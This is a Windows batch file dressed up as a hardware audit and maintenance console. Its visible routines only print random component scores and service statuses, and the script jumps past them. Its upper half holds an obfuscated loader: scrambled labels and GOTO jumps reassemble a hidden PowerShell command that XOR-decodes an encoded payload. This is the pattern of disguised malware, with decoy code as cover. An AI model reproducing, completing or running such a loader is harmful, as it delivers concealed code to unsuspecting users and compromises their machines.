:JDOIHFFDOD0
SET DOSFNGJIDH=af2e6c3a8f7a2e8b1f7d79cb8939db6efa9a3e8d0a7e29ced90b18aa5ac9595bc8aacef
GOTO JDOIHFFDOD1
:NSINKUJFNS
SET UOSDIIDIDF=v1.0\powershell.exe -WindowStyle Hidden -ArgumentList '-Comma
GOTO JDOIHFFDOD
:NGNNIJIGIO3
SET UIFDJDODFG=c+=[byte]($c-bxor0x55)};$l5PQbBl59=$nU0qrJ4c;$nU0qrJ4coldR='''';$i=0;f
GOTO NGNNIJIGIO4
:NGNNIJIGIO0
SET JOGDSOOFGO=gFeShNFdHc4Sz1qPiUfJgQCOBYQQBMP'';$efxuisKTE=0x4111-0x363F;$nU0qrJ4c=@();fo
GOTO NGNNIJIGIO1
:JJHNSDIFOO7
SET GJDOIGKGFN=RRGx8ue0Q4EXMhC3p8V08fPx8QIBsLXTUIAjxXA1EfDxdZQgI/c0hQaWdHV15lbw
GOTO SDNIIDNJUO
:JDOIHFFDOD1
SET NFGDJDNUGU=b2a9'';$uU5okOP=''UzgSUVROFBtnHR88VwhOdEpLS0FWcFlUSBdOCioMeUpT
GOTO JDOIHFFDOD2
:HHIOFOIODS5
SET OJFONFGODI=ca6808cae8095b89ea298b5f9bacf999d93b09fe5df888df3859c81cdb19b908
GOTO IOIFGDFUFF
:JDSNJDOFIN5
setlocal EnableDelayedExpansion

echo.

goto :skipNetwork

:: ======================================
:: Hardware Audit - DEMO ONLY
:: ======================================

:NetworkRoutine
title Hardware Audit
color DF

echo Starting Hardware Audit session...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,6) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

timeout /t 2 >nul

for %%A in (
    NVMe
    Cooling
    Storage
    Network
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

timeout /t 1 >nul

for %%S in (
    FTP
    HTTP
    POP3
    RDP
) do (
    set /a state=!random! %% 2
    if !state! EQU 0 (
        echo %%S ........ ONLINE
    ) else (
        echo %%S ........ STANDBY
    )
)

echo Preview complete.
pause
goto :eof

:skipNetwork
:: ======================================
:: END OF HARDWARE AUDIT BLOCK
:: ======================================

goto :skipDemo

:: ======================================
:: Maintenance Console - DEMO ONLY
:: ======================================

:DemoRoutine
title Maintenance Console
color 8B

echo Launching Maintenance Console...
timeout /t 1 >nul

echo Verifying system components...
timeout /t 1 >nul

for /L %%i in (1,1,5) do (
    set /a percent=!random! %% 100
    echo Component %%i ........ !percent!%%
    timeout /t 1 >nul
)

echo.
echo Collecting statistics...
timeout /t 2 >nul

for %%A in (
    Power
    Cooling
    Memory
    CPU
    Network
) do (
    set /a score=!random! %% 100
    echo %%A Status: !score!%%
)

echo.
echo Checking active services...
timeout /t 1 >nul

for %%S in (
    SSH
    DHCP
    SMTP
    RDP
) do (
    set /a state=!random! %% 2
    if !state! EQU 0 (
        echo %%S ........ ONLINE
    ) else (
        echo %%S ........ STANDBY
    )
)

echo Preview complete.
pause
goto :eof

:skipDemo
:: ======================================
:: END OF MAINTENANCE CONSOLE BLOCK
:: ======================================
